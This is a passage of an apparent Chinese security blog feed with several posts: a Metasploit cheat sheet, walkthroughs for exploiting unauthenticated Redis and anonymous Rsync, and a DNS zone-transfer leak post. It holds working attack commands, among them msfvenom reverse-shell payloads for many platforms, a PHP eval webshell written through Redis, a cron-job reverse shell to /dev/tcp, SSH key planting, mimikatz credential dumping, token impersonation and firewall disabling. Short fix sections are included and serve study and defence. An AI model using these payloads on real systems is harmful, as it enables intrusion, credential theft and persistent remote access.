<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/21296806" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/21296806</a><br><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="external">http://www.s2.sshz.org/post/source-code-leak/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>Meatsploit Framework 利用总结</title>
    <link href="http://uknowsec.cn/posts/skill/Meatsploit-Framework-%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93.html"/>
    <id>http://uknowsec.cn/posts/skill/Meatsploit-Framework-利用总结.html</id>
    <published>2017-07-13T04:15:40.000Z</published>
    <updated>2017-07-13T06:27:16.975Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="msfvenom-Payload-List"><a href="#msfvenom-Payload-List" class="headerlink" title="msfvenom Payload List"></a>msfvenom Payload List</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</div></pre></td></tr></table></figure>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</div></pre></td></tr></table></figure>
<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</div></pre></td></tr></table></figure>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</div><div class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</div></pre></td></tr></table></figure>
<h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</div></pre></td></tr></table></figure>
<h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</div></pre></td></tr></table></figure>
<h3 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</div></pre></td></tr></table></figure>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</div></pre></td></tr></table></figure>
<h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</div></pre></td></tr></table></figure>
<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</div></pre></td></tr></table></figure>
<h2 id="Handlers"><a href="#Handlers" class="headerlink" title="Handlers"></a>Handlers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set PAYLOAD &lt;Payload name&gt;</div><div class="line">set LHOST &lt;LHOST value&gt;</div><div class="line">set LPORT &lt;LPORT value&gt;</div><div class="line">set ExitOnSession false</div><div class="line">exploit -j -z</div></pre></td></tr></table></figure>
<h2 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use auxiliary/scanner/portscan/tcp</div><div class="line">show options</div><div class="line">set LHOST &lt;LHOST value&gt;</div><div class="line">set LPORTS &lt;LPORT value&gt;</div><div class="line">exploit</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon2.jpg" alt=""></p>
<h2 id="Windows-Smb模块"><a href="#Windows-Smb模块" class="headerlink" title="Windows Smb模块"></a>Windows Smb模块</h2><h3 id="扫描smb判断主机"><a href="#扫描smb判断主机" class="headerlink" title="扫描smb判断主机"></a>扫描smb判断主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">use auxiliary/scanner/smb/smb_version</div><div class="line">show options</div><div class="line">exploit</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon3.jpg" alt=""></p>
<h3 id="爆破smb密码"><a href="#爆破smb密码" class="headerlink" title="爆破smb密码"></a>爆破smb密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use auxiliary/scanner/smb/smb_login</div><div class="line">set SMBUser administrator</div><div class="line">set PASS_FILE /tmp/pass</div><div class="line">set RHOSTS 192.168.1.116</div><div class="line">exploit</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon4.jpg" alt=""></p>
<h3 id="开启3389远程桌面"><a href="#开启3389远程桌面" class="headerlink" title="开启3389远程桌面"></a>开启3389远程桌面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; run post/windows/manage/enable_rdp</div></pre></td></tr></table></figure>
<h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">shell</div><div class="line">netsh adcfirewall set allprofiles state off</div></pre></td></tr></table></figure>
<h3 id="实时截图"><a href="#实时截图" class="headerlink" title="实时截图"></a>实时截图</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">screenshot</div><div class="line">use espia</div></pre></td></tr></table></figure>
<h3 id="meterpreter加载mimikatz抓取明文密码"><a href="#meterpreter加载mimikatz抓取明文密码" class="headerlink" title="meterpreter加载mimikatz抓取明文密码"></a>meterpreter加载mimikatz抓取明文密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt;load mimikatz</div><div class="line">msv</div><div class="line">kerberos</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon1.jpg" alt=""></p>
<h3 id="窃取及伪造域账户-token"><a href="#窃取及伪造域账户-token" class="headerlink" title="窃取及伪造域账户 token"></a>窃取及伪造域账户 token</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">load incognito</div><div class="line">list_tokens -u</div><div class="line">impersonate_token xxxxx\\xxxxxxx</div><div class="line">execute -f cmd.exe -i -t</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon6.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
    
    
  </entry>
  
  <entry>
    <title>配置漏洞之redis未授权访问</title>
    <link href="http://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8Bredis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.html"/>
    <id>http://uknowsec.cn/posts/skill/配置漏洞之redis未授权访问.html</id>
    <published>2017-07-12T09:35:01.000Z</published>
    <updated>2017-07-17T07:55:42.821Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><h3 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h3><p>解压缩后编译源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ wget http://download.redis.io/releases/redis-2.8.3.tar.gz</div><div class="line">$ tar xzf redis-2.8.3.tar.gz</div><div class="line">$ cd redis-2.8.3</div><div class="line">$ make</div></pre></td></tr></table></figure></p>
<h3 id="编译完成后"><a href="#编译完成后" class="headerlink" title="编译完成后"></a>编译完成后</h3><p>在Src目录下，有四个可执行文件redis-server、redis-benchmark、redis-cli和redis.conf。然后拷贝到一个目录下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mkdir /usr/redis</div><div class="line">cp redis-server  /usr/redis</div><div class="line">cp redis-benchmark /usr/redis</div><div class="line">cp redis-cli  /usr/redis</div><div class="line">cp redis.conf  /usr/redis</div><div class="line">cd /usr/redis</div></pre></td></tr></table></figure>
<h3 id="启动redis服务"><a href="#启动redis服务" class="headerlink" title="启动redis服务"></a>启动redis服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./redis-server ./redis.conf</div></pre></td></tr></table></figure>
<h3 id="查看redis是否开启"><a href="#查看redis是否开启" class="headerlink" title="查看redis是否开启"></a>查看redis是否开启</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -ntlp | grep redis</div></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
<li>保存到www目录，创建webshell</li>
<li>创建SSH authorized_keys文件</li>
<li>写计划任务（/var/spool/cron/&amp;/etc/cron.d/）</li>
<li>slave of 8.8.8.8主从模式利用</li>
<li>写入到/etc/profile.d/用户环境变量</li>
<li>开启AOF持久化纯文本记录appendfilename</li>
</ul>
<h3 id="利用nmap获取redis信息"><a href="#利用nmap获取redis信息" class="headerlink" title="利用nmap获取redis信息"></a>利用nmap获取redis信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -A -p6379 --script=redis-info 192.168.132.134</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/redis1.jpg" alt=""></p>
<h3 id="利用redis客户端进行未授权访问"><a href="#利用redis客户端进行未授权访问" class="headerlink" title="利用redis客户端进行未授权访问"></a>利用redis客户端进行未授权访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./redis-cli -h 192.168.132.134</div><div class="line">192.168.132.134:6379&gt; info</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/redis2.jpg" alt=""></p>
<p>当然，如果redis存在访问密码的话，可以使用如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./redis-cli -h 192.168.132.134 –a [password]</div></pre></td></tr></table></figure></p>
<h3 id="利用redis连接写入ssh公钥"><a href="#利用redis连接写入ssh公钥" class="headerlink" title="利用redis连接写入ssh公钥"></a>利用redis连接写入ssh公钥</h3><h4 id="在攻击机上生成ssh公钥和私钥"><a href="#在攻击机上生成ssh公钥和私钥" class="headerlink" title="在攻击机上生成ssh公钥和私钥"></a>在攻击机上生成ssh公钥和私钥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/redis3.jpg" alt=""></p>
<h4 id="将公钥写入文本"><a href="#将公钥写入文本" class="headerlink" title="将公钥写入文本"></a>将公钥写入文本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd ~/.ssh/</div><div class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;)&gt; 1.txt</div></pre></td></tr></table></figure>
<h4 id="将1-txt写入redis"><a href="#将1-txt写入redis" class="headerlink" title="将1.txt写入redis"></a>将1.txt写入redis</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat 1.txt | /usr/local/redis/./redis-cli -h 192.168.132.134 -x set crack</div></pre></td></tr></table></figure>
<h4 id="利用redis客户端连接靶机redis"><a href="#利用redis客户端连接靶机redis" class="headerlink" title="利用redis客户端连接靶机redis"></a>利用redis客户端连接靶机redis</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./redis-cli -h 192.168.132.134</div></pre></td></tr></table></figure>
<h4 id="获取redis备份的路径"><a href="#获取redis备份的路径" class="headerlink" title="获取redis备份的路径"></a>获取redis备份的路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG GET dir</div></pre></td></tr></table></figure>
<h4 id="更改redis备份路径"><a href="#更改redis备份路径" class="headerlink" title="更改redis备份路径"></a>更改redis备份路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG SET dir /root/.ssh</div></pre></td></tr></table></figure>
<h4 id="设置备份文件的名称为authorized-keys"><a href="#设置备份文件的名称为authorized-keys" class="headerlink" title="设置备份文件的名称为authorized_keys"></a>设置备份文件的名称为authorized_keys</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG SET dbfilename authorized_keys</div></pre></td></tr></table></figure>
<h4 id="检查是否更改"><a href="#检查是否更改" class="headerlink" title="检查是否更改"></a>检查是否更改</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG GET dbfilename</div></pre></td></tr></table></figure>
<h4 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; save</div></pre></td></tr></table></figure>
<h4 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh –i  id_rsa root@192.168.1.11</div></pre></td></tr></table></figure>
<h3 id="利用redis写入Shell"><a href="#利用redis写入Shell" class="headerlink" title="利用redis写入Shell"></a>利用redis写入Shell</h3><h4 id="查看是否存在web服务"><a href="#查看是否存在web服务" class="headerlink" title="查看是否存在web服务"></a>查看是否存在web服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap 192.168.1.111</div></pre></td></tr></table></figure>
<h4 id="确定web服务目录"><a href="#确定web服务目录" class="headerlink" title="确定web服务目录"></a>确定web服务目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">config set dir /usr/local/apache/htdocs/</div><div class="line">config set dbfilename ok.php </div><div class="line">set test &quot;&lt;?php @eval($_POST[123]);?&gt;&quot;</div><div class="line">save</div></pre></td></tr></table></figure>
<h4 id="菜刀连接一句话木马"><a href="#菜刀连接一句话木马" class="headerlink" title="菜刀连接一句话木马"></a>菜刀连接一句话木马</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli0.png" alt=""></p>
<h3 id="写计划任务来反弹shell"><a href="#写计划任务来反弹shell" class="headerlink" title="写计划任务来反弹shell"></a>写计划任务来反弹shell</h3><h4 id="telnet登录-也可以redis-cli登录"><a href="#telnet登录-也可以redis-cli登录" class="headerlink" title="telnet登录/也可以redis-cli登录"></a>telnet登录/也可以redis-cli登录</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli1.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">telnet 192.168.236.130 6379 //未授权登录</div><div class="line"></div><div class="line">config set dir /var/spool/cron/ //配置文件夹的路径（CONFIG SET 命令可以动态地调整 Redis 服务器的配置而(configuration)而无须重启。）//每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面</div><div class="line"></div><div class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.236.129/9999 0&gt;&amp;1\n\n\n&quot; //直接往当前用户的crontab里写入反弹shell，换行是必不可少的。</div></pre></td></tr></table></figure>
<h4 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli2.png" alt=""></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul>
<li>禁止使用 root 权限启动 redis 服务；</li>
<li>对 redis 访问启用密码认证，并且添加 IP 访问限制；</li>
<li>尽可能不对公网直接开放 SSH 服务。</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
    
    
  </entry>
  
  <entry>
    <title>配置漏洞之DNS域传送信息泄露</title>
    <link href="http://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BDNS%E5%9F%9F%E4%BC%A0%E9%80%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.html"/>
    <id>http://uknowsec.cn/posts/skill/配置漏洞之DNS域传送信息泄露.html</id>
    <published>2017-07-12T08:17:07.000Z</published>
    <updated>2017-07-12T08:36:59.080Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Dns是整个互联网公司业务的基础，目前越来越多的互联网公司开始自己搭建DNS服务器做解析服务，同时由于DNS服务是基础性服务非常重要，因此很多公司会对DNS服务器进行主备配置而DNS主备之间的数据同步就会用到dns域传送，但如果配置不当，就会导致任何匿名用户都可以获取DNS服务器某一域的所有记录，将整个企业的基础业务以及网络架构对外暴露从而造成严重的信息泄露，甚至导致企业网络被渗透。</p>
<h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>DNS服务器的主备数据同步，使用的是域传送功能。 域传送关键配置项为：</p>
<p>allow-transfer {ipaddress;}; 通过ip限制可进行域传送的服务器</p>
<p>allow-transfer { key transfer; }; 通过key限制可进行域传送的服务器</p>
<p>options配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">options &#123;  </div><div class="line">listen-on &#123; 1.1.1.1; &#125;;  </div><div class="line">listen-on-v6 &#123; any; &#125;;  </div><div class="line">directory &quot;/bind&quot;;  </div><div class="line">pid-file &quot;/bind/run/pid&quot;;  </div><div class="line">dump-file &quot;/bind/data/named_dump.db&quot;;  </div><div class="line">statistics-file &quot;/bind/data/named.stats&quot;;</div><div class="line"></div><div class="line">    allow-transfer  &#123; any; &#125;;</div><div class="line">    allow-query    &#123;any;&#125;;</div><div class="line"></div><div class="line"></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>zone配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">zone &quot;wooyun.org&quot; &#123;  </div><div class="line">type master;  </div><div class="line">file &quot;/bind/etc/wooyun.org.conf&quot;;  </div><div class="line">allow-transfer &#123;any;&#125;;  </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>笔者测试版本为BIND 9.8.2rc1-RedHat-9.8.2-0.10.rc1.el6_3.6，默认安装完毕后，配置项没有allow-transfer 项。如果直接使用默认配置文件进行配置的话（不手动添加allow-transfer项），就会存在dns 域传送漏洞。</p>
<h2 id="攻击方式及危害"><a href="#攻击方式及危害" class="headerlink" title="攻击方式及危害"></a>攻击方式及危害</h2><p>恶意用户可以通过dns域传送获取被攻击域下所有的子域名。会导致一些非公开域名（测试域名、内部域名）泄露。而泄露的类似内部域名，其安全性相对较低，更容易遭受攻击者的攻击，比较典型的譬如内部的测试机往往就会缺乏必要的安全设置。</p>
<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><h3 id="window利用方式"><a href="#window利用方式" class="headerlink" title="window利用方式"></a>window利用方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nslookup</div><div class="line">server dns.xx.com</div><div class="line">ls xx.com</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/dns.jpg" alt=""></p>
<h3 id="linux利用方式"><a href="#linux利用方式" class="headerlink" title="linux利用方式"></a>linux利用方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dig @dns.xx.com. axfr xx.com</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/dns2.jpg" alt=""></p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>解决域传送问题非常简单，只需要在相应的zone、options中添加allow-transfer限制可以进行同步的服务器就可以了，可以有两种方式：限制IP、使用key认证。</p>
<p>参考链接：<br><a href="http://wooyun.jozxing.cc/static/drops/papers-64.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/papers-64.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
    
    
  </entry>
  
  <entry>
    <title>配置漏洞之Rsync匿名访问</title>
    <link href="http://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BRsync%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE.html"/>
    <id>http://uknowsec.cn/posts/skill/配置漏洞之Rsync匿名访问.html</id>
    <published>2017-07-12T07:24:00.000Z</published>
    <updated>2017-07-12T08:14:11.816Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="Rsync简介"><a href="#Rsync简介" class="headerlink" title="Rsync简介"></a>Rsync简介</h2><p>Rsync，remote synchronize顾名思意就知道它是一款实现远程同步功能的软件，它在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。</p>
<p>rsync是用 “rsync 算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，而且可以通过ssh方式来传输文件，这样其保密性也非常好，另外它还是免费的软件。</p>
<p>rsync 包括如下的一些特性：</p>
<ul>
<li>能更新整个目录和树和文件系统；</li>
<li>有选择性的保持符号链链、硬链接、文件属于、权限、设备以及时间等；</li>
<li>对于安装来说，无任何特殊权限要求；</li>
<li>对于多个文件来说，内部流水线减少文件等待的延时；</li>
<li>能用rsh、ssh 或直接端口做为传输入端口；</li>
<li>支持匿名rsync 同步文件，是理想的镜像工具；</li>
</ul>
<h2 id="寻找匿名访问Rsync方式"><a href="#寻找匿名访问Rsync方式" class="headerlink" title="寻找匿名访问Rsync方式"></a>寻找匿名访问Rsync方式</h2><p>Rsync默认的端口是873，可以使用nmap扫描哪些ip开放了873端口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -n --open -p 873 X.X.X.X/24</div></pre></td></tr></table></figure></p>
<h2 id="漏洞利用常用操作"><a href="#漏洞利用常用操作" class="headerlink" title="漏洞利用常用操作"></a>漏洞利用常用操作</h2><h3 id="例举整个同步目录或指定目录"><a href="#例举整个同步目录或指定目录" class="headerlink" title="例举整个同步目录或指定目录"></a>例举整个同步目录或指定目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rsync 10.0.0.12::</div><div class="line">rsync 10.0.0.12::www/</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync1.jpg" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync2.jpg" alt=""></p>
<h3 id="下载文件或目录到本地"><a href="#下载文件或目录到本地" class="headerlink" title="下载文件或目录到本地"></a>下载文件或目录到本地</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rsync -avz 10.0.0.12::www/test.php /root</div><div class="line">rsync -avz 10.0.0.12::www/ /var/tmp</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync3.jpg" alt=""></p>
<h3 id="上传本地文件到服务端"><a href="#上传本地文件到服务端" class="headerlink" title="上传本地文件到服务端"></a>上传本地文件到服务端</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rsync -avz webshell.php 10.0.0.12::www/</div></pre></td></tr></table></figure>
<h2 id="漏洞利用实例"><a href="#漏洞利用实例" class="headerlink" title="漏洞利用实例"></a>漏洞利用实例</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/rsync.jpg" alt=""></p>
<h2 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h2><p>Metasploit中关于允许匿名访问的rsync扫描模块：<br>auxiliary/scanner/rsync/modules_list</p>
<p>针对rsync口令暴力破解的脚本rsync-brute:<br><a href="https://svn.nmap.org/nmap/scripts/rsync-brute.nse" target="_blank" rel="external">https://svn.nmap.org/nmap/scripts/rsync-brute.nse</a></p>
<h2 id="安全配置注意事项"><a href="#安全配置注意事项" class="headerlink" title="安全配置注意事项"></a>安全配置注意事项</h2><p>注意两种方式防御，一是限定访问的IP，另一个是不允许匿名访问，添加用户口令。</p>
<h3 id="限定IP的两种方式"><a href="#限定IP的两种方式" class="headerlink" title="限定IP的两种方式"></a>限定IP的两种方式</h3><p>IPTables防火墙</p>
<p>给rsync的端口添加一个iptables。</p>
<p>只希望能够从内部网络（192.168.101.0/24）访问：</p>
